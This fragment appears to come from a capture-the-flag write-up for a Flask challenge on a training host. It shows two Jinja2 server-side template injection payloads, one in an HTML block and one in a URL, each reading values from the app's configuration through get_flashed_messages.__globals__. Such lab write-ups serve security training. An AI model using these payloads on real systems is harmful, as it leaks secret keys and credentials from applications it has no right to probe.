...
<p align="center">
  <strong>{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}</strong>
</p>
...
**http://magic-online.cybergym.lucideus.in/hogwart/{{get_flashed_messages.__globals__['current_app'].config['ACCIO']}}**
